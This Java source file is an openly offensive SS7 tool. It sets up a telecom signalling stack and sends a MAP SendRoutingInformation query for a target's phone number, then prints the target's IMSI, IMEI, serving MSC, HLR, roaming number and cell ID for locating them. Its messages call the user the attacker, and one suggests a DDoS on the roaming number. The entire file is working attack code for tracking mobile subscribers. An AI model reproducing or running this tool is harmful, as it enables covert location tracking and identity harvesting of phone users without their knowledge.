/**
 * Created by gh0 on 12/26/16.
 * <p>
 * Created by gh0 on 11/3/16.
 */
/**
 * Created by gh0 on 11/3/16.
 */

import java.util.Scanner;

import org.apache.log4j.Logger;
import org.mobicents.protocols.api.IpChannelType;
import org.mobicents.protocols.sctp.ManagementImpl;
import org.mobicents.protocols.ss7.indicator.NatureOfAddress;
import org.mobicents.protocols.ss7.indicator.RoutingIndicator;
import org.mobicents.protocols.ss7.m3ua.ExchangeType;
import org.mobicents.protocols.ss7.m3ua.Functionality;
import org.mobicents.protocols.ss7.m3ua.IPSPType;
import org.mobicents.protocols.ss7.m3ua.impl.AspImpl;
import org.mobicents.protocols.ss7.m3ua.impl.M3UAManagementImpl;
import org.mobicents.protocols.ss7.m3ua.impl.parameter.ParameterFactoryImpl;
import org.mobicents.protocols.ss7.m3ua.parameter.RoutingContext;
import org.mobicents.protocols.ss7.m3ua.parameter.TrafficModeType;
import org.mobicents.protocols.ss7.map.MAPStackImpl;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContext;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContextName;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContextVersion;
import org.mobicents.protocols.ss7.map.api.MAPDialog;
import org.mobicents.protocols.ss7.map.api.MAPDialogListener;
import org.mobicents.protocols.ss7.map.api.MAPException;
import org.mobicents.protocols.ss7.map.api.MAPMessage;
import org.mobicents.protocols.ss7.map.api.MAPProvider;
import org.mobicents.protocols.ss7.map.api.dialog.MAPAbortProviderReason;
import org.mobicents.protocols.ss7.map.api.dialog.MAPAbortSource;
import org.mobicents.protocols.ss7.map.api.dialog.MAPNoticeProblemDiagnostic;
import org.mobicents.protocols.ss7.map.api.dialog.MAPRefuseReason;
import org.mobicents.protocols.ss7.map.api.dialog.MAPUserAbortChoice;
import org.mobicents.protocols.ss7.map.api.errors.MAPErrorMessage;
import org.mobicents.protocols.ss7.map.api.primitives.AddressNature;
import org.mobicents.protocols.ss7.map.api.primitives.AddressString;
import org.mobicents.protocols.ss7.map.api.primitives.IMSI;
import org.mobicents.protocols.ss7.map.api.primitives.ISDNAddressString;
import org.mobicents.protocols.ss7.map.api.primitives.MAPExtensionContainer;
import org.mobicents.protocols.ss7.map.api.primitives.NumberingPlan;
import org.mobicents.protocols.ss7.map.api.service.callhandling.InterrogationType;
import org.mobicents.protocols.ss7.map.api.service.callhandling.IstCommandRequest;
import org.mobicents.protocols.ss7.map.api.service.callhandling.IstCommandResponse;
import org.mobicents.protocols.ss7.map.api.service.callhandling.MAPDialogCallHandling;
import org.mobicents.protocols.ss7.map.api.service.callhandling.MAPServiceCallHandlingListener;
import org.mobicents.protocols.ss7.map.api.service.callhandling.ProvideRoamingNumberRequest;
import org.mobicents.protocols.ss7.map.api.service.callhandling.ProvideRoamingNumberResponse;
import org.mobicents.protocols.ss7.map.api.service.callhandling.SendRoutingInformationRequest;
import org.mobicents.protocols.ss7.map.api.service.callhandling.SendRoutingInformationResponse;
import org.mobicents.protocols.ss7.sccp.OriginationType;
import org.mobicents.protocols.ss7.sccp.RuleType;
import org.mobicents.protocols.ss7.sccp.SccpProvider;
import org.mobicents.protocols.ss7.sccp.impl.SccpStackImpl;
import org.mobicents.protocols.ss7.sccp.parameter.GlobalTitle0100;
import org.mobicents.protocols.ss7.sccp.parameter.SccpAddress;
import org.mobicents.protocols.ss7.tcap.TCAPStackImpl;
import org.mobicents.protocols.ss7.tcap.api.TCAPStack;
import org.mobicents.protocols.ss7.tcap.asn.ApplicationContextName;
import org.mobicents.protocols.ss7.tcap.asn.comp.Problem;

abstract class SRILowLevel implements MAPDialogListener, MAPServiceCallHandlingListener {

    // MTP Details

    protected int CLIENT_SPC;
    protected int SERVER_SPC; // PC of adjacent STP
    protected int NETWORK_INDICATOR; // International
    protected int SERVICE_INDICATOR = 3; // SCCP
    protected int SSN_Server = 6; // HLR SSN
    protected int SSN_Client = 8; // MSC SSN

    // M3UA details
    protected String CLIENT_IP;
    protected int CLIENT_PORT;

    protected String SERVER_IP;
    protected int SERVER_PORT;

    protected String CLIENT_ASSOCIATION_NAME = "clientAsscoiation";

    // Target Details
    String MSISDN;

    // Attacker Details
    String MSC;

    protected final ParameterFactoryImpl factory = new ParameterFactoryImpl();

    protected SRILowLevel() {

        init();
    }

    public void init() {
        try {

            Scanner user_input = new Scanner(System.in);

            System.out.print("\033[34m[*]\033[0mSet Client PC: ");
            CLIENT_SPC = user_input.nextInt();
            System.out.print("\033[34m[*]\033[0mSet Peer PC: ");
            SERVER_SPC = user_input.nextInt();

            System.out.print("\033[34m[*]\033[0mSet Client IP: ");
            CLIENT_IP = user_input.next();
            System.out.print("\033[34m[*]\033[0mSet Client Port: ");
            CLIENT_PORT = user_input.nextInt();
            System.out.print("\033[34m[*]\033[0mSet Peer IP: ");
            SERVER_IP = user_input.next();
            System.out.print("\033[34m[*]\033[0mSet Peer Port: ");
            SERVER_PORT = user_input.nextInt();

            System.out.print("\033[34m[*]\033[0mSet Network Indicator [0] International [2] National: ");
            NETWORK_INDICATOR = user_input.nextInt();

            System.out.print("\033[34m[*]\033[0mEnter Target's MSISDN: ");
            MSISDN = user_input.next();

            System.out.print("\033[34m[*]\033[0mEnter your MSC GT : ");
            MSC = user_input.next();

            System.out.println("\033[32m[*]\033[0mStack components are set...");
            System.out.println("\033[32m[*]\033[0mInitializing the Stack...");

        } catch (Exception ex) {
            System.out.println("\033[31m[-]\033[0mError: " + ex.getMessage());

        }

    }
}

public class SendRoutingInfo extends SRILowLevel {

    private static Logger logger = Logger.getLogger(SendRoutingInfo.class);

    // SCTP

    private ManagementImpl sctpManagement;

    // M3UA
    private M3UAManagementImpl clientM3UAMgmt;

    // SCCP
    private SccpStackImpl sccpStack;
    private SccpProvider sccpProvider;

    // TCAP
    private TCAPStack tcapStack;

    // MAP
    private MAPStackImpl mapStack;
    private MAPProvider mapProvider;

    public SendRoutingInfo() {
        // TODO Auto-generated constructor stub

    }

    protected void initializeStack(IpChannelType ipChannelType) throws Exception {

        this.initSCTP(ipChannelType);

        // Initialize M3UA first
        this.initM3UA();

        // Initialize SCCP
        this.initSCCP();

        // Initialize TCAP
        this.initTCAP();

        // Initialize MAP
        this.initMAP();

        // FInally start ASP
        this.clientM3UAMgmt.startAsp("ASP1");

    }

    private void initSCTP(IpChannelType ipChannelType) throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing SCTP Stack ....");
        try {
            this.sctpManagement = new ManagementImpl("Client");
            this.sctpManagement.setSingleThread(true);
            this.sctpManagement.start();
            this.sctpManagement.setConnectDelay(10000);
            this.sctpManagement.removeAllResourses();

            // Create SCTP Association
            sctpManagement.addAssociation(CLIENT_IP, CLIENT_PORT, SERVER_IP, SERVER_PORT, CLIENT_ASSOCIATION_NAME,
                    ipChannelType, null);

            System.out.println("\033[32m[+]\033[0mInitialized SCTP Stack ....");
        } catch (Exception e) {
            System.out.println("\033[31m[-]\033[0mError Initializing SCTP: " + e.getMessage());
            System.exit(1);
        }

    }

    private void initM3UA() throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing M3UA Stack ....");
        try {
            this.clientM3UAMgmt = new M3UAManagementImpl("Client", null);
            this.clientM3UAMgmt.setTransportManagement(this.sctpManagement);
            this.clientM3UAMgmt.start();
            this.clientM3UAMgmt.removeAllResourses();

            // m3ua as create rc <rc> <ras-name>
            RoutingContext rc = factory.createRoutingContext(new long[]{100l});
            TrafficModeType trafficModeType = factory.createTrafficModeType(TrafficModeType.Loadshare);

            this.clientM3UAMgmt.createAs("AS1", Functionality.IPSP, ExchangeType.SE, IPSPType.CLIENT, rc,
                    trafficModeType, 1, null);

            // Step 2 : Create ASP
            this.clientM3UAMgmt.createAspFactory("ASP1", CLIENT_ASSOCIATION_NAME);

            // Step3 : Assign ASP to AS
            AspImpl asp = this.clientM3UAMgmt.assignAspToAs("AS1", "ASP1");

            // Step 4: Add Route. Remote point code
            clientM3UAMgmt.addRoute(SERVER_SPC, CLIENT_SPC, SERVICE_INDICATOR, "AS1");
            System.out.println("\033[32m[+]\033[0mInitialized M3UA Stack ....");
        } catch (Exception e) {
            System.out.println("\033[31m[-]\033[0mError Initializing M3UA: " + e.getMessage());
            System.exit(2);

        }

    }

    private void initSCCP() throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing SCCP Stack ....");

        try {
            this.sccpStack = new SccpStackImpl("MapLoadClientSccpStack");
            this.sccpStack.setMtp3UserPart(1, this.clientM3UAMgmt);

            this.sccpStack.start();
            this.sccpStack.removeAllResourses();

            this.sccpStack.getSccpResource().addRemoteSpc(1, SERVER_SPC, 0, 0);
            this.sccpStack.getSccpResource().addRemoteSsn(1, SERVER_SPC, SSN_Server, 0, false);

            this.sccpStack.getRouter().addMtp3ServiceAccessPoint(1, 1, CLIENT_SPC, NETWORK_INDICATOR, 0, null);

            this.sccpStack.getRouter().addMtp3Destination(1, 1, SERVER_SPC, SERVER_SPC, 0, 255, 255);

            this.sccpProvider = this.sccpStack.getSccpProvider();

            // SCCP routing table
            GlobalTitle0100 remoteGT = this.sccpProvider.getParameterFactory().createGlobalTitle("*", 0,
                    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                    NatureOfAddress.INTERNATIONAL);
            GlobalTitle0100 localMSCGT = this.sccpProvider.getParameterFactory().createGlobalTitle(MSC, 0,
                    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                    NatureOfAddress.INTERNATIONAL);

            this.sccpStack.getRouter().addRoutingAddress(1, this.sccpProvider.getParameterFactory().createSccpAddress(
                    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remoteGT, SERVER_SPC, SSN_Server));

            this.sccpStack.getRouter().addRoutingAddress(2, this.sccpProvider.getParameterFactory().createSccpAddress(
                    RoutingIndicator.ROUTING_BASED_ON_DPC_AND_SSN, localMSCGT, CLIENT_SPC, SSN_Client));

            SccpAddress patternRemote = this.sccpProvider.getParameterFactory().createSccpAddress(
                    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remoteGT, SERVER_SPC, SSN_Server);
            SccpAddress patternLocal = this.sccpProvider.getParameterFactory().createSccpAddress(
                    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localMSCGT, CLIENT_SPC, SSN_Client);

            String maskRemote = "K";
            String maskLocal = "R";

            // translate local GT to its POC+SSN (local rule)GTT
            this.sccpStack.getRouter().addRule(1, RuleType.SOLITARY, null, OriginationType.LOCAL, patternRemote,
                    maskRemote, 1, -1, null, 0, null);
            this.sccpStack.getRouter().addRule(2, RuleType.SOLITARY, null, OriginationType.REMOTE, patternLocal,
                    maskLocal, 2, -1, null, 0, null);

            System.out.println("\033[32m[+]\033[0mInitialized SCCP Stack ....");
        } catch (Exception e) {
            System.out.println("\033[31m[-]\033[0mError Initializing SCCP: " + e.getMessage());
            System.exit(3);
        }

    }

    private void initTCAP() throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing TCAP Stack ....");
        try {
            this.tcapStack = new TCAPStackImpl("Test", this.sccpStack.getSccpProvider(), SSN_Client);
            this.tcapStack.start();
            this.tcapStack.setDialogIdleTimeout(60000);
            this.tcapStack.setInvokeTimeout(30000);
            this.tcapStack.setMaxDialogs(2000);
            System.out.println("\033[32m[+]\033[0mInitialized TCAP Stack ....");
        } catch (Exception e) {
            System.out.println("\033[31m[-]\033[0mError Initializing TCAP: " + e.getMessage());
            System.exit(4);
        }
    }

    private void initMAP() throws Exception {
        System.out.println("\033[34m[*]\033[0mInitializing MAP Stack ....");

        try {

            this.mapStack = new MAPStackImpl("MAP-HLR", this.tcapStack.getProvider());
            this.mapProvider = this.mapStack.getMAPProvider();

            this.mapProvider.addMAPDialogListener(this);
            this.mapProvider.getMAPServiceCallHandling().addMAPServiceListener(this);

            this.mapProvider.getMAPServiceCallHandling().acivate();

            this.mapStack.start();
            System.out.println("\033[32m[+]\033[0mInitialized MAP Stack ....");

        } catch (Exception e) {
            System.out.println("\033[31m[-]\033[0mFailed to Initialize MAP: " + e.getMessage());
            System.exit(5);
        }

    }

    private void initiateSRI() throws MAPException {

        try {
            // Creating the target MSISDN
            ISDNAddressString msisdn = this.mapProvider.getMAPParameterFactory()
                    .createISDNAddressString(AddressNature.international_number, NumberingPlan.ISDN, MSISDN);

            // Creating Attacker GMSC address
            ISDNAddressString Gmsc = this.mapProvider.getMAPParameterFactory()
                    .createISDNAddressString(AddressNature.international_number, NumberingPlan.ISDN, MSC);

            System.out.println("\033[34m[*]\033[0mLocating Target: " + MSISDN);

            // Creating the GT for the target MSISDN for routing
            GlobalTitle0100 gtTarget = this.sccpProvider.getParameterFactory().createGlobalTitle(MSISDN, 0,
                    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                    NatureOfAddress.INTERNATIONAL);

            // Creating the GT for Querying GMSC
            GlobalTitle0100 gtGMSC = this.sccpProvider.getParameterFactory().createGlobalTitle(MSC, 0,
                    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
                    NatureOfAddress.INTERNATIONAL);

            SccpAddress callingParty = this.sccpStack.getSccpProvider().getParameterFactory()
                    .createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, gtGMSC, CLIENT_SPC, SSN_Client);

            SccpAddress calledParty = this.sccpStack.getSccpProvider().getParameterFactory().createSccpAddress(
                    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, gtTarget, SERVER_SPC, SSN_Server);

            // First create Dialog
            MAPDialogCallHandling mapDialog = this.mapProvider.getMAPServiceCallHandling().createNewDialog(
                    MAPApplicationContext.getInstance(MAPApplicationContextName.locationInfoRetrievalContext,
                            MAPApplicationContextVersion.version3),
                    callingParty, null, calledParty, null);

            mapDialog.addSendRoutingInformationRequest(msisdn, null, null, InterrogationType.basicCall, false, null,
                    Gmsc, null, null, null, null, null, false, null, null, false, null, null, null, false, null, false,
                    false, false, false, null, null, null, false, null);

            // This will initiate the TC-BEGIN with INVOKE component
            mapDialog.send();
            System.out.println("\033[34m[*]\033[0mLocation Retrieval for Target " + MSISDN + " is processing..\n");
        } catch (MAPException e) {
            System.out.println("\033[31m[-]\033[0mMAP Error: " + e.getMessage());
            System.out.println("\033[31m[-]\033[0mTerminating Session...");
            System.exit(5);
        }

    }

    public void onDialogAccept(MAPDialog mapDialog, MAPExtensionContainer extensionContainer) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("onDialogAccept for DialogId=%d MAPExtensionContainer=%s\n",
                    mapDialog.getLocalDialogId(), extensionContainer));

        }
    }

    public void onDialogClose(MAPDialog mapDialog) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("DialogClose for Dialog=%d\n", mapDialog.getLocalDialogId()));

        }

    }

    public void onDialogDelimiter(MAPDialog mapDialog) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("onDialogDelimiter for DialogId=%d\n", mapDialog.getLocalDialogId()));

        }
    }

    public void onDialogNotice(MAPDialog mapDialog, MAPNoticeProblemDiagnostic noticeProblemDiagnostic) {
        System.err.printf("\033[31m[-]\033[0mMAP DialogNotice for DialogId=%d MAPNoticeProblemDiagnostic=%s \n",
                mapDialog.getLocalDialogId(), noticeProblemDiagnostic);

    }

    public void onDialogProviderAbort(MAPDialog mapDialog, MAPAbortProviderReason abortProviderReason,
                                      MAPAbortSource abortSource, MAPExtensionContainer extensionContainer) {

        System.err.printf(
                "\033[31m[-]\033[0mMAPDialogProviderAbort for DialogId=%d MAPAbortProviderReason=%s MAPAbortSource=%s MAPExtensionContainer=%s\n",
                mapDialog.getLocalDialogId(), abortProviderReason, abortSource, extensionContainer);
        System.exit(10);
    }

    public void onDialogReject(MAPDialog mapDialog, MAPRefuseReason refuseReason,
                               ApplicationContextName alternativeApplicationContext, MAPExtensionContainer extensionContainer) {

        System.err.printf(
                "\033[31m[-]\033[0mMAPDialogReject for DialogId=%d MAPRefuseReason=%s MAPProviderError=%s ApplicationContextName=%s MAPExtensionContainer=%s\n",
                mapDialog.getLocalDialogId(), refuseReason, alternativeApplicationContext, extensionContainer);
        System.exit(11);
    }

    public void onDialogRelease(MAPDialog mapDialog) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("onDialogResease for DialogId=%d\n", mapDialog.getLocalDialogId()));

        }
    }

    public void onDialogRequest(MAPDialog mapDialog, AddressString destReference, AddressString origReference,
                                MAPExtensionContainer extensionContainer) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format(
                    "onDialogRequest for DialogId=%d DestinationReference=%s OriginReference=%s MAPExtensionContainer=%s\n",
                    mapDialog.getLocalDialogId(), destReference, origReference, extensionContainer));

        }
    }

    @Override
    public void onDialogRequestEricsson(MAPDialog mapDialog, AddressString addressString, AddressString addressString1,
                                        AddressString addressString2, AddressString addressString3) {

    }

    public void onDialogRequestEricsson(MAPDialog mapDialog, AddressString destReference, AddressString origReference,
                                        IMSI arg3, AddressString arg4) {
        if (logger.isDebugEnabled()) {
            logger.debug(String.format("onDialogRequest for DialogId=%d DestinationReference=%s OriginReference=%s\n",
                    mapDialog.getLocalDialogId(), destReference, origReference));

        }
    }

    public void onDialogTimeout(MAPDialog mapDialog) {

        System.err.printf("\033[31m[-]\033[0mMAP DialogTimeout for DialogId=%d\n", mapDialog.getLocalDialogId());
        System.exit(15);
    }

    public void onDialogUserAbort(MAPDialog mapDialog, MAPUserAbortChoice userReason,
                                  MAPExtensionContainer extensionContainer) {

        System.err.printf(
                "\033[31m[-]\033[0mMAP DialogUserAbort for DialogId=%d MAPUserAbortChoice=%s MAPExtensionContainer=%s\n",
                mapDialog.getLocalDialogId(), userReason, extensionContainer);
        System.exit(16);
    }

    public void onErrorComponent(MAPDialog mapDialog, Long invokeId, MAPErrorMessage mapErrorMessage) {

        System.err.printf("\033[31m[-]\033[0mMAP ErrorComponent for Dialog=%d and invokeId=%d MAPErrorMessage=%s\n",
                mapDialog.getLocalDialogId(), invokeId, mapErrorMessage);
        System.exit(17);
    }

    @Override
    public void onRejectComponent(MAPDialog mapDialog, Long aLong, Problem problem, boolean b) {

    }

    public void onInvokeTimeout(MAPDialog mapDialog, Long invokeId) {

        System.err.printf("\033[31m[-]\033[0mMAP Dialog InvokeTimeout for Dialog=%d and invokeId=%d\n",
                mapDialog.getLocalDialogId(), invokeId);
        System.exit(18);

    }

    public void onMAPMessage(MAPMessage mapMessage) {
        // TODO Auto-generated method stub

    }

    public void onProviderErrorComponent(MAPDialog mapDialog, Long invokeId) {

        System.err.printf(
                "\033[31m[-]\033[0mMAP ProviderErrorComponent for Dialog=%d and invokeId=%d MAPProviderError=%s\n",
                mapDialog.getLocalDialogId(), invokeId);
        System.exit(19);
    }

    public void onRejectComponent(MAPDialog mapDialog, Long invokeId, Problem problem) {

        System.err.printf("\033[31m[-]\033[0mMAP RejectComponent for Dialog=%d and invokeId=%d Problem=%s\n",
                mapDialog.getLocalDialogId(), invokeId, problem);
        System.exit(20);
    }

    public static void main(String args[]) {
        System.out.println("*********************************************");
        System.out.println("***            Locating Target            ***");
        System.out.println("*********************************************");
        IpChannelType ipChannelType = IpChannelType.SCTP;

        try {
            final SendRoutingInfo attacker = new SendRoutingInfo();

            attacker.initializeStack(ipChannelType);

            // Lets pause for 20 seconds so stacks are initialized properly
            Thread.sleep(20000);
            attacker.initiateSRI();

        } catch (Exception e) {
            System.out.println("\033[31m[-]\033[0mError Initiating Attack: " + e.getMessage());
            System.exit(21);
        }

    }

    @Override
    public void onSendRoutingInformationRequest(SendRoutingInformationRequest sendRoutingInformationRequest) {

    }

    @Override
    public void onSendRoutingInformationResponse(SendRoutingInformationResponse sendRoutingInformationResponse) {
        System.out.println("******* Target's Info and Location *******");
        String Vmsc = "";
        String imsi = "";
        String imei = "";
        String hlr = "";
        String msrn = "";
        String status = "";
        try {

            imei = sendRoutingInformationResponse.getSubscriberInfo().getIMEI().getIMEI();
            imsi = sendRoutingInformationResponse.getIMSI().getData();
            msrn = sendRoutingInformationResponse.getRoutingInfo2().getRoamingNumber().getAddress();
            hlr = sendRoutingInformationResponse.getMAPDialog().getRemoteAddress().getGlobalTitle().getDigits();

            Vmsc = sendRoutingInformationResponse.getVmscAddress().getAddress();
            status = sendRoutingInformationResponse.getSubscriberInfo().getSubscriberState()
                    .getSubscriberStateChoice().toString();
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (imei.isEmpty()) {
            System.out.println("\033[31m[-]\033[0mNo Info returned for the IMEI parameter");
        } else {
            System.out.println("\033[32m[+]\033[0mIMEI:\033[31m " + imei);
        }
        if (imsi.isEmpty()) {
            System.out.println("\033[31m[-]\033[0mNo Info returned for the IMSI parameter");
        } else {
            System.out.println("\033[32m[+]\033[0mIMSI of the target is:\033[31m " + imsi);
        }
        if (Vmsc.isEmpty()) {
            System.out.println("\033[32m[-]\033[0mNo Info returned for the parameter MSC");
        } else {
            System.out.println("\033[32m[+]\033[0mTarget is served by the MSC:\033[31m " + Vmsc);
        }
        System.out.println("\033[32m[+]\033[0mTarget is served by the HLR:\033[31m " + hlr);
        if (msrn.isEmpty()) {
            System.out.println("\033[31m[-]\033[0mNo Info returned for the MSRN parameter");
        } else {
            System.out.println("\033[32m[+]\033[0mRoaming Number used to route calls to target(MSRN):\033[31m "
                    + msrn + "\tThinking of a DDoS attack :)");
        }

        System.out.println("\033[32m[+]\033[0mTarget State:\033[31m " + status);
        try {
            if (sendRoutingInformationResponse.getSubscriberInfo().getLocationInformation()
                    .getCellGlobalIdOrServiceAreaIdOrLAI() == null) {
                System.out.println("\033[31m[-]\033[0mNo Info returned for the Cell Global ID parameter");
            } else {

                if (sendRoutingInformationResponse.getSubscriberInfo().getLocationInformation()
                        .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength() != null) {

                    int mcc = sendRoutingInformationResponse.getSubscriberInfo().getLocationInformation()
                            .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getMCC();
                    int mnc = sendRoutingInformationResponse.getSubscriberInfo().getLocationInformation()
                            .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getMNC();
                    int lac = sendRoutingInformationResponse.getSubscriberInfo().getLocationInformation()
                            .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength().getLac();
                    int ci = sendRoutingInformationResponse.getSubscriberInfo().getLocationInformation()
                            .getCellGlobalIdOrServiceAreaIdOrLAI().getCellGlobalIdOrServiceAreaIdFixedLength()
                            .getCellIdOrServiceAreaCode();
                    System.out.println("\033[32m[+]\033[0mCellID:\033[31mMCC(" + Integer.toString(mcc) + ")" + "MNC("
                            + Integer.toString(mnc) + ")" + "LAC(" + Integer.toString(lac) + ")" + "CI("
                            + Integer.toString(ci) + ")" + "\tCheck it out on opencellid.org");
                }
                if (sendRoutingInformationResponse.getSubscriberInfo().getLocationInformation()
                        .getCellGlobalIdOrServiceAreaIdOrLAI().getLAIFixedLength() != null) {

                    int mccLai = sendRoutingInformationResponse.getSubscriberInfo().getLocationInformation()
                            .getCellGlobalIdOrServiceAreaIdOrLAI().getLAIFixedLength().getMCC();
                    int mncLai = sendRoutingInformationResponse.getSubscriberInfo().getLocationInformation()
                            .getCellGlobalIdOrServiceAreaIdOrLAI().getLAIFixedLength().getMNC();
                    int lacLai = sendRoutingInformationResponse.getSubscriberInfo().getLocationInformation()
                            .getCellGlobalIdOrServiceAreaIdOrLAI().getLAIFixedLength().getLac();

                    System.out.println("\033[32m[+]\033[0mLAI:\033[31mLAIMCC(" + Integer.toString(mccLai) + ")"
                            + "LAIMNC(" + Integer.toString(mncLai) + ")" + "LAILAC(" + Integer.toString(lacLai) + ")");
                }
            }

            System.out.println(
                    "\033[34m[**]\033[0mSubscriber's Information Gathering and Network Probing is completed\033[34m[**]\033[0m");
            System.out.println("\033[34m[*]\033[0mClosing Session...");

        } catch (Exception e) {
            System.out.println("\033[31m[-]\033[0mError on Locating Target: " + e.getMessage());
            System.exit(22);
        }
        try {
            Thread.sleep(10000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        System.exit(0);

    }

    @Override
    public void onProvideRoamingNumberRequest(ProvideRoamingNumberRequest provideRoamingNumberRequest) {

    }

    @Override
    public void onProvideRoamingNumberResponse(ProvideRoamingNumberResponse provideRoamingNumberResponse) {

    }

    @Override
    public void onIstCommandRequest(IstCommandRequest istCommandRequest) {

    }

    @Override
    public void onIstCommandResponse(IstCommandResponse istCommandResponse) {

    }
}
